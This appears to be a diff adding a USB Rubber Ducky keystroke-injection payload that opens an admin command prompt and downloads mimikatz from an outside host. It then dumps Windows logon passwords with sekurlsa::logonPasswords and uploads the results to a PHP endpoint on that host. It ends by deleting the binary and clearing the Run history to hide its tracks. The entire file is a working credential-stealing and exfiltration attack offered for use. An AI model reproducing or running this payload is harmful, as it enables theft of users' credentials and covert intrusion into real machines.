@@ -1,0 +1,55 @@
+REM Title: Invoke mimikatz and send creds to remote server
+REM Author: AlfieJ04
+DELAY 1000
+REM Open an admin cmd window 
+GUI r
+DELAY 500
+STRING powershell Start-Process cmd -Verb runAs
+ENTER
+DELAY 2000
+REM Obfuscate the command prompt
+REM STRING mode con:cols=18 lines=1
+REM ENTER
+REM STRING color FE
+REM ENTER
+REM -------------download appropriate mimikatz for architecture
+STRING powershell if ([System.IntPtr]::Size -eq 4) { (new-object System.Net.WebClient).DownloadFile('http://www.ihack.eu/files/Win32/mimikatz.exe','%TEMP%\pw.exe');  }else{ (new-object System.Net.WebClient).DownloadFile('http://www.ihack.eu/files/x64/mimikatz.exe','%TEMP%\pw.exe');}
+DELAY 1000
+ENTER
+DELAY 5000
+REM -------------get the passwords and save to $env:TEMP\pwlog.txt
+STRING cd %TEMP%
+DELAY 300
+ENTER
+DELAY 300
+STRING .\pw.exe > pwlog.txt & type pwlog.txt
+ENTER
+DELAY 4000
+STRING privilege::debug
+ENTER
+DELAY 1000
+STRING sekurlsa::logonPasswords full
+ENTER
+DELAY 1000
+STRING exit
+ENTER
+DELAY 300
+STRING del %TEMP%\pw.exe
+ENTER
+DELAY 300
+REM Upload the results
+REM Create $content variable and store pwlog.txt to it
+STRING powershell 
+DELAY 4000
+ENTER
+STRING $content = (gc -Path $env:TEMP\pwlog.txt | out-string); (New-Object Net.WebClient).UploadString('http://www.ihack.eu/files/rx.php', $content)
+DELAY 1500
+ENTER
+REM Clear the Run history and exit
+STRING "Remove-ItemProperty -Path 'HKCU:SoftwareMicrosoftWindowsCurrentVersionExplorerRunMRU' -Name '*' -ErrorAction SilentlyContinue"
+ENTER
+STRING exit
+ENTER
+DELAY 300
+STRING exit
+ENTER
